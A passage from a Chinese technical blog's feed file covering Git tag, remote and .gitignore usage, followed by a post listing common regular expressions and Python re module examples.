commit</span><br></pre></td></tr></table></figure><p>如果我们忘了给某个提交打标签，又将它发布了，我们可以给它追加标签。<br>例如，假设我们发布了提交 85fc7e7(上面实例最后一行)，但是那时候忘了给它打标签。 我们现在也可以：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ git tag -a v0.9 a055c08</span><br><span class="line">$ git <span class="built_in">log</span> --oneline --graph --decorate</span><br><span class="line">*   2b5970d (HEAD -&gt; master, tag: v1.0) Merge branch <span class="string">'change_site'</span></span><br><span class="line">|\</span><br><span class="line">| * d17a0a0 (change_site) change the site</span><br><span class="line">* | e2714c9 新增加一行</span><br><span class="line">|/</span><br><span class="line">* 202199d (newtest) add test.txt file</span><br><span class="line">* a055c08 (tag: v0.9) 修改 HelloWorld.java 文件</span><br><span class="line">* ad5f6fe 修改</span><br><span class="line">* c2c167c 修改HelloWorld.java文件</span><br><span class="line">* f9393bf third commit ``</span><br><span class="line">* 316fafc second commit</span><br><span class="line">* fdd5c53 inital commit</span><br></pre></td></tr></table></figure><p>如果要查看所有标签可以使用以下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git tag</span><br></pre></td></tr></table></figure><p>指定标签信息命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag -a &lt;tagname&gt; -m <span class="string">"标签"</span></span><br></pre></td></tr></table></figure><p>PGP签名标签命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag -s &lt;tagname&gt; -m <span class="string">"标签"</span></span><br></pre></td></tr></table></figure><h3 id="Git-远程仓库的操作"><a href="#Git-远程仓库的操作" class="headerlink" title="Git 远程仓库的操作"></a>Git 远程仓库的操作</h3><h4 id="查看当前远程库"><a href="#查看当前远程库" class="headerlink" title="查看当前远程库"></a>查看当前远程库</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git remote</span><br><span class="line">origin</span><br><span class="line">$ git remote -v</span><br><span class="line">origin  git@xx.xx.xxx.xxx:/test.git (fetch)</span><br><span class="line">origin  git@xx.xx.xxx.xxx:/test.git (push)</span><br></pre></td></tr></table></figure><h4 id="提取远程库"><a href="#提取远程库" class="headerlink" title="提取远程库"></a>提取远程库</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull</span><br></pre></td></tr></table></figure><p>该命令就是在执行 git fetch 之后紧接着执行 git merge 远程分支到你所在的任意分支。<br>假设你配置好了一个远程仓库，并且你想要提取更新的数据，你可以首先执行 git fetch [alias] 告诉 Git 去获取它有你没有的数据，然后你可以执行 git merge [alias]/[branch] 以将服务器上的任何更新（假设有人这时候推送到服务器了）合并到你的当前分支。</p><p>接下来我们在 Github 上点击”test.txt” 并在线修改它。之后我们在本地更新修改。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch origin</span><br><span class="line">remote: Counting objects: 3, <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (3/3), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0</span><br><span class="line">Unpacking objects: 100% (3/3), <span class="keyword">done</span>.</span><br><span class="line">From github.com:onlynight/GitAdd</span><br><span class="line">   774112b..37be49b  master     -&gt; origin/master</span><br><span class="line">$ git merge origin/master</span><br><span class="line">Updating 774112b..37be49b</span><br><span class="line">Fast-forward</span><br><span class="line"> test.txt | 1 +</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure><h4 id="推送远程库"><a href="#推送远程库" class="headerlink" title="推送远程库"></a>推送远程库</h4><p>推送你的新分支与数据到某个远端仓库命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#该命令将你的 [branch] 分支推送成为 [alias] 远程仓库上的 [branch] 分支</span></span><br><span class="line">$ git push [<span class="built_in">alias</span>] [branch]</span><br><span class="line"></span><br><span class="line">$ git push origin master</span><br><span class="line">Everything up-to-date</span><br></pre></td></tr></table></figure><h4 id="删除远程分支"><a href="#删除远程分支" class="headerlink" title="删除远程分支"></a>删除远程分支</h4><p>注意：如果要<em>删除远程分支</em>同样也是使用push命令，在分支前加上”:”表示<em>删除远程分支</em>，代码如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin :&lt;branch name&gt;</span><br></pre></td></tr></table></figure><h4 id="删除本地仓库的远程仓库链接"><a href="#删除本地仓库的远程仓库链接" class="headerlink" title="删除本地仓库的远程仓库链接"></a>删除本地仓库的远程仓库链接</h4><p>删除远程仓库你可以使用命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">git remote rm [<span class="built_in">alias</span>]</span><br><span class="line"></span><br><span class="line">$ git remote -v</span><br><span class="line">origin  git@github.com:onlynight/GitAdd.git (fetch)</span><br><span class="line">origin  git@github.com:onlynight/GitAdd.git (push)</span><br><span class="line">$ git remote -v</span><br><span class="line">origin  git@github.com:onlynight/GitAdd.git (fetch)</span><br><span class="line">origin  git@github.com:onlynight/GitAdd.git (push)</span><br><span class="line">origin2 git@github.com:onlnynight/GitAdd.git (fetch)</span><br><span class="line">origin2 git@github.com:onlnynight/GitAdd.git (push)</span><br><span class="line">$ git remote rm origin2</span><br><span class="line">$ git remote -v</span><br><span class="line">origin  git@github.com:onlynight/GitAdd.git (fetch)</span><br><span class="line">origin  git@github.com:onlynight/GitAdd.git (push)</span><br></pre></td></tr></table></figure><h3 id="忽略特殊文件"><a href="#忽略特殊文件" class="headerlink" title="忽略特殊文件"></a>忽略特殊文件</h3><p>有些时候，你必须把某些文件放到Git工作目录中，但又不能提交它们，比如保存了数据库密码的配置文件啦，等等，每次<code>git status</code>都会显示<code>Untracked files ...</code>，有强迫症的童鞋心里肯定不爽。</p><p>好在Git考虑到了大家的感受，这个问题解决起来也很简单，在Git工作区的根目录下创建一个特殊的<code>.gitignore</code>文件，然后把要忽略的文件名填进去，Git就会自动忽略这些文件。</p><p>不需要从头写<code>.gitignore</code>文件，GitHub已经为我们准备了各种配置文件，只需要组合一下就可以使用了。所有配置文件可以直接在线浏览：<a href="https://github.com/github/gitignore" target="_blank" rel="noopener">https://github.com/github/gitignore</a></p><p>忽略文件的原则是：</p><ol><li>忽略操作系统自动生成的文件，比如缩略图等；</li><li>忽略编译生成的中间文件、可执行文件等，也就是如果一个文件是通过另一个文件自动生成的，那自动生成的文件就没必要放进版本库，比如Java编译产生的<code>.class</code>文件；</li><li>忽略你自己的带有敏感信息的配置文件，比如存放口令的配置文件。</li></ol><p>举个例子：</p><p>假设你在Windows下进行Python开发，Windows会自动在有图片的目录下生成隐藏的缩略图文件，如果有自定义目录，目录下就会有<code>Desktop.ini</code>文件，因此你需要忽略Windows自动生成的垃圾文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows:</span></span><br><span class="line">Thumbs.db</span><br><span class="line">ehthumbs.db</span><br><span class="line">Desktop.ini</span><br><span class="line"><span class="comment"># Python:</span></span><br><span class="line">*.py[cod]</span><br><span class="line">*.so</span><br><span class="line">*.egg</span><br><span class="line">*.egg-info</span><br><span class="line">dist</span><br><span class="line">build</span><br><span class="line"><span class="comment"># My configurations:</span></span><br><span class="line">db.ini</span><br><span class="line">deploy_key_rsa</span><br></pre></td></tr></table></figure><p>最后一步就是把<code>.gitignore</code>也提交到Git，就完成了！当然检验<code>.gitignore</code>的标准是<code>git status</code>命令是不是说<code>working directory clean</code>。</p><p>使用Windows的童鞋注意了，如果你在资源管理器里新建一个<code>.gitignore</code>文件，它会非常弱智地提示你必须输入文件名，但是在文本编辑器里“保存”或者“另存为”就可以把文件保存为<code>.gitignore</code>了。</p><p>有些时候，你想添加一个文件到Git，但发现添加不了，原因是这个文件被<code>.gitignore</code>忽略了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git add App.class</span><br><span class="line">The following paths are ignored by one of your .gitignore files:</span><br><span class="line">App.class</span><br><span class="line">Use -f if you really want to add them.</span><br></pre></td></tr></table></figure><p>如果你确实想添加该文件，可以用<code>-f</code>强制添加到Git：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git add -f App.class</span><br></pre></td></tr></table></figure><p>或者你发现，可能是<code>.gitignore</code>写得有问题，需要找出来到底哪个规则写错了，可以用<code>git check-ignore</code>命令检查：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git check-ignore -v App.class</span><br><span class="line">.gitignore:3:*.classApp.class</span><br></pre></td></tr></table></figure><p>Git会告诉我们，<code>.gitignore</code>的第3行规则忽略了该文件，于是我们就可以知道应该修订哪个规则。</p><ul><li>后续：搭建git服务器</li></ul>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Regular Expression</title>
      <link href="/2019/09/22/re/"/>
      <url>/2019/09/22/re/</url>
      
        <content type="html"><![CDATA[<h2 id="正则表达式的规则"><a href="#正则表达式的规则" class="headerlink" title="正则表达式的规则"></a>正则表达式的规则</h2><p>常用元字符</p><table><thead><tr><th style="text-align:left">代码</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">.</td><td style="text-align:left">匹配除换行符以外的任意字符</td></tr><tr><td style="text-align:left">\w</td><td style="text-align:left">匹配字母或数字或下划线</td></tr><tr><td style="text-align:left">\s</td><td style="text-align:left">匹配任意的空白符</td></tr><tr><td style="text-align:left">\d</td><td style="text-align:left">匹配数字</td></tr><tr><td style="text-align:left">\b</td><td style="text-align:left">匹配单词的开始或结束</td></tr><tr><td style="text-align:left">^</td><td style="text-align:left">匹配字符串的开始</td></tr><tr><td style="text-align:left">$</td><td style="text-align:left">匹配字符串的结束</td></tr></tbody></table><p>常用限定符</p><table><thead><tr><th style="text-align:left">代码/语法</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">*</td><td style="text-align:left">重复零次或更多次</td></tr><tr><td style="text-align:left">+</td><td style="text-align:left">重复一次或更多次</td></tr><tr><td style="text-align:left">?</td><td style="text-align:left">重复零次或一次</td></tr><tr><td style="text-align:left">{n}</td><td style="text-align:left">重复n次</td></tr><tr><td style="text-align:left">{n,}</td><td style="text-align:left">重复n次或更多次</td></tr><tr><td style="text-align:left">{n,m}</td><td style="text-align:left">重复n到m次</td></tr></tbody></table><p>常用反义词</p><table><thead><tr><th style="text-align:left">代码/语法</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">\W</td><td style="text-align:left">匹配任意不是字母，数字，下划线，汉字的字符</td></tr><tr><td style="text-align:left">\S</td><td style="text-align:left">匹配任意不是空白符的字符</td></tr><tr><td style="text-align:left">\D</td><td style="text-align:left">匹配任意非数字的字符</td></tr><tr><td style="text-align:left">\B</td><td style="text-align:left">匹配不是单词开头或结束的位置</td></tr><tr><td style="text-align:left">[^x]</td><td style="text-align:left">匹配除了x以外的任意字符</td></tr><tr><td style="text-align:left">[^aeiou]</td><td style="text-align:left">匹配除了aeiou这几个字母以外的任意字符</td></tr></tbody></table><p><strong>预定义字符集表</strong></p><table><thead><tr><th>\d</th><th>\d匹配任何十进制数，它相当于类[0-9]，\d+如果需要匹配一位或者多位数的数字时用</th></tr></thead><tbody><tr><td>\D</td><td>\D匹配任何非数字字符，它相当于类[^0-9]</td></tr><tr><td>\s</td><td>\s匹配任何空白字符，它相当于类[\t\n\r\f\v]</td></tr><tr><td>\S</td><td>\S匹配任何非空白字符，它相当于类[^\t\n\r\f\v]</td></tr><tr><td>\w</td><td>\w匹配包括下划线在内任何字母数字字符，它相当于类  <code>{a-z,A-Z,0-9,_}</code></td></tr><tr><td>\W</td><td>\W匹配非任何字母数字字符包括下划线在内，它相当于类 <code>{ ^a-z,A-Z,0-9,_}</code></td></tr><tr><td>\A</td><td>仅匹配字符串开头,同^</td></tr><tr><td>\Z</td><td>仅匹配字符串结尾，同$</td></tr><tr><td>\b</td><td>b匹配一个单词边界，也就是指单词和空格间的位置</td></tr><tr><td>\B</td><td>[^\b]</td></tr></tbody></table><h2 id="常用正则表达式"><a href="#常用正则表达式" class="headerlink" title="常用正则表达式"></a>常用正则表达式</h2><blockquote><p>引用：<a href="http://www.cnblogs.com/zxin/archive/2013/01/26/2877765.html" target="_blank" rel="noopener">史上最全常用正则表达式大全</a></p></blockquote><h3 id="一、校验数字的表达式"><a href="#一、校验数字的表达式" class="headerlink" title="一、校验数字的表达式"></a>一、校验数字的表达式</h3><ol><li><p>数字：<code>^[0-9]*$</code></p></li><li><p>n位的数字：<code>^\d{n}$</code></p></li><li><p>至少n位的数字：<code>^\d{n,}$</code></p></li><li><p>m-n位的数字：<code>^\d{m,n}$</code></p></li><li><p>零和非零开头的数字：<code>^(0|[1-9][0-9]*)$</code></p></li><li><p>非零开头的最多带两位小数的数字：<code>^([1-9][0-9]*)+(.[0-9]{1,2})?$</code></p></li><li><p>带1-2位小数的正数或负数：<code>^(\-)?\d+(\.\d{1,2})?$</code></p></li><li><p>正数、负数、和小数：<code>^(\-|\+)?\d+(\.\d+)?$</code></p></li><li><p>有两位小数的正实数：<code>^[0-9]+(.[0-9]{2})?$</code></p></li><li><p>有1~3位小数的正实数：<code>^[0-9]+(.[0-9]{1,3})?$</code></p></li><li><p>非零的正整数：<code>^[1-9]\d*$</code> 或 <code>^([1-9][0-9]*){1,3}$</code> 或 <code>^\+?[1-9][0-9]*$</code></p></li><li><p>非零的负整数：<code>^\-[1-9][]0-9&quot;*$</code> 或 <code>^-[1-9]\d*$</code></p></li><li><p>非负整数：<code>^\d+$</code> 或 <code>^[1-9]\d*|0$</code></p></li><li><p>非正整数：<code>^-[1-9]\d*|0$</code> 或 <code>^((-\d+)|(0+))$</code></p></li><li><p>非负浮点数：<code>^\d+(\.\d+)?$</code> 或 <code>^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$</code></p></li><li><p>非正浮点数：<code>^((-\d+(\.\d+)?)|(0+(\.0+)?))$</code> 或                                                                <code>^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$</code></p></li><li><p>正浮点数：<code>^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$</code> 或                                                                        <code>^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$</code></p></li><li><p>负浮点数：<code>^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$</code> 或 <code>^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$</code></p></li><li><p>浮点数：<code>^(-?\d+)(\.\d+)?$</code> 或 <code>^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$</code></p></li></ol><h3 id="二、校验字符的表达式"><a href="#二、校验字符的表达式" class="headerlink" title="二、校验字符的表达式"></a>二、校验字符的表达式</h3><ol><li><p>汉字：<code>^[\u4e00-\u9fa5]{0,}$</code></p></li><li><p>英文和数字：<code>^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$</code></p></li><li><p>长度为3-20的所有字符：<code>^.{3,20}$</code></p></li><li><p>由26个英文字母组成的字符串：<code>^[A-Za-z]+$</code></p></li><li><p>由26个大写英文字母组成的字符串：<code>^[A-Z]+$</code></p></li><li><p>由26个小写英文字母组成的字符串：<code>^[a-z]+$</code></p></li><li><p>由数字和26个英文字母组成的字符串：<code>^[A-Za-z0-9]+$</code></p></li><li><p>由数字、26个英文字母或者下划线组成的字符串：<code>^\w+$ 或 ^\w{3,20}$</code></p></li><li><p>中文、英文、数字包括下划线：<code>^[\u4E00-\u9FA5A-Za-z0-9_]+$</code></p></li><li><p>中文、英文、数字但不包括下划线等符号：<code>^[\u4E00-\u9FA5A-Za-z0-9]+$</code>或                                           <code>^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$</code></p></li></ol><ol start="11"><li>可以输入含有^%&amp;’,;=?$\”等字符：<code>[^%&amp;&#39;,;=?$\x22]+ 12</code> </li><li>禁止输入含有~的字符：<code>[^~\x22]+</code></li></ol><h3 id="三、特殊需求表达式"><a href="#三、特殊需求表达式" class="headerlink" title="三、特殊需求表达式"></a>三、特殊需求表达式</h3><ol><li><p>Email地址：<code>^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$</code></p></li><li><p>域名：<code>[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.?</code></p></li><li><p>InternetURL：<code>[a-zA-z]+://[^\s]*</code> 或  <code>^http://([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*)?$</code></p></li><li><p>手机号码：<code>^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$</code></p></li><li><p>电话号码(“XXX-XXXXXXX”、”XXXX-XXXXXXXX”、”XXX-XXXXXXX”、”XXX-XXXXXXXX”、”XXXXXXX”和”XXXXXXXX)：<code>^(\(\d{3,4}-)|\d{3.4}-)?\d{7,8}$</code></p></li><li><p>国内电话号码(0511-4405222、021-87888822)：<code>\d{3}-\d{8}|\d{4}-\d{7}</code></p></li><li><p>身份证号(15位、18位数字)：<code>^\d{15}|\d{18}$</code></p></li><li><p>短身份证号码(数字、字母x结尾)：<code>^([0-9]){7,18}(x|X)?$</code>或<code>^\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$</code></p></li><li><p>帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：<code>^[a-zA-Z][a-zA-Z0-9_]{4,15}$</code></p></li></ol><ol start="10"><li><p>密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：<code>^[a-zA-Z]\w{5,17}$</code></p></li><li><p>强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：                <code>^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$</code></p></li></ol><ol start="12"><li><p>日期格式：<code>^\d{4}-\d{1,2}-\d{1,2}</code></p></li><li><p>一年的12个月(01～09和1～12)：<code>^(0?[1-9]|1[0-2])$</code></p></li><li><p>一个月的31天(01～09和1～31)：<code>^((0?[1-9])|((1|2)[0-9])|30|31)$</code></p></li></ol><ol start="15"><li><p>钱的输入格式：</p><p>有四种钱的表示形式我们可以接受:”10000.00” 和 “10,000.00”, 和没有 “分” 的 “10000” 和 “10,000”：<code>^[1-9][0-9]*$</code></p><p>这表示任意一个不以0开头的数字,但是,这也意味着一个字符”0”不通过,所以我们采用下面的形式：<code>^(0|[1-9][0-9]*)$</code></p><p>一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：<code>^(0|-?[1-9][0-9]*)$</code></p><p>这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：<code>^[0-9]+(.[0-9]+)?$</code></p><p>必须说明的是,小数点后面至少应该有1位数,所以”10.”是不通过的,但是 “10” 和 “10.2” 是通过的：<code>^[0-9]+(.[0-9]{2})?$</code></p><p>这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：<code>^[0-9]+(.[0-9]{1,2})?$</code></p><p>这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：                            <code>^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$</code></p><p>到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：                                               <code>^([0-9]+|[0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$</code></p><p>备注：这就是最终结果了,别忘了”+”可以用”*”替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里</p></li></ol><ol start="16"><li><p>xml文件：<code>^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\.[x|X][m|M][l|L]$</code></p></li><li><p>中文字符的正则表达式：<code>[\u4e00-\u9fa5]</code></p></li><li><p>双字节字符：<code>[^\x00-\xff]</code> (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1))</p></li><li>空白行的正则表达式：<code>\n\s*\r</code>(可以用来删除空白行)*</li><li>HTML标记的正则表达式：<code>&lt;(\S*?)[^&gt;]*&gt;.*?&lt;/\1&gt;|&lt;.*? /&gt;</code> (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力)</li><li>首尾空白字符的正则表达式：<code>^\s*|\s*$</code>或 <code>(^\s*)|(\s*$)</code> (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)</li><li>腾讯QQ号：<code>[1-9][0-9]{4,}</code> (腾讯QQ号从10000开始)</li><li>中国邮政编码：<code>[1-9]\d{5}(?!\d)</code> (中国邮政编码为6位数字)</li><li>IP地址：<code>\d+\.\d+\.\d+\.\d+</code> (提取IP地址时有用)</li><li>IP地址：<code>((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))</code></li></ol><h2 id="Python-re模块"><a href="#Python-re模块" class="headerlink" title="Python re模块"></a>Python re模块</h2><p>人生苦短，不如Python。</p><blockquote><p>引用：<a href="https://blog.csdn.net/jamfiy/article/details/88139202" target="_blank" rel="noopener">python基础—re模块—正则表达式</a></p></blockquote><p>python从1.5版本起增加re模块为自带的模块，提供了Perl风格的正则表达式模式</p><p>以下是python re库的常用函数</p><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">compile(pattern[, flags])</td><td style="text-align:center">根据包含正则表达式的字符串创建模式对象</td></tr><tr><td style="text-align:center">search(pattern, string[, flags])</td><td style="text-align:center">在字符串中查找模式</td></tr><tr><td style="text-align:center">match(pattern, string[, flags])</td><td style="text-align:center">在字符串开头匹配模式</td></tr><tr><td style="text-align:center">split(pattern, string[, maxsplit=0])</td><td style="text-align:center">根据模式来分割字符串</td></tr><tr><td style="text-align:center">findall(pattern, string)</td><td style="text-align:center">返回一个列表，其中包含字符串中所有与模式匹配的子串</td></tr><tr><td style="text-align:center">sub(pat, repl, string[, count=0])</td><td style="text-align:center">将字符串中与模式pat匹配的子串都替换为repl</td></tr><tr><td style="text-align:center">escape(string)</td><td style="text-align:center">对字符串中所有的正则表达式特殊字符都进行转义</td></tr></tbody></table><ul><li><h4 id="re-compile"><a href="#re-compile" class="headerlink" title="re.compile()"></a>re.compile()</h4></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</span><br><span class="line"></span><br><span class="line">语法格式为：</span><br><span class="line"></span><br><span class="line">re.compile(pattern[, flags])</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pattern = re.compile(<span class="string">r'\d+'</span>) <span class="comment"># 用于匹配至少一个数字</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = pattern.match(<span class="string">'one12twothree34four'</span>) <span class="comment"># 查找头部，没有匹配</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(m)</span><br><span class="line"></span><br><span class="line"><span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = pattern.match(<span class="string">'one12twothree34four'</span>, <span class="number">2</span>, <span class="number">10</span>) <span class="comment"># 从'e'的位置开始匹配，没有匹配</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(m)</span><br><span class="line"></span><br><span class="line"><span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = pattern.match(<span class="string">'one12twothree34four'</span>, <span class="number">3</span>, <span class="number">10</span>) <span class="comment"># 从'1'的位置开始匹配，正好匹配 &gt;&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">print(m) <span class="comment"># 返回一个 Match 对象</span></span><br><span class="line">&lt;_sre.SRE_Match object at <span class="number">0x10a42aac0</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">0</span>) <span class="comment"># 可省略 0 '12'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.start(<span class="number">0</span>) <span class="comment"># 可省略 0 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.end(<span class="number">0</span>) <span class="comment"># 可省略 0 5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.span(<span class="number">0</span>) <span class="comment"># 可省略 0 (3, 5)</span></span><br><span class="line"></span><br><span class="line">在上面，当匹配成功时返回一个 Match 对象，其中：</span><br><span class="line"></span><br><span class="line">group([group1, …]) 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(<span class="number">0</span>)；</span><br><span class="line">start([group]) 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 <span class="number">0</span>；</span><br><span class="line">end([group]) 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+<span class="number">1</span>），参数默认值为 <span class="number">0</span>；</span><br><span class="line">span([group]) 方法返回 (start(group), end(group))。</span><br><span class="line">再看看一个例子：</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pattern = re.compile(<span class="string">r'([a-z]+) ([a-z]+)'</span>, re.I) <span class="comment"># re.I 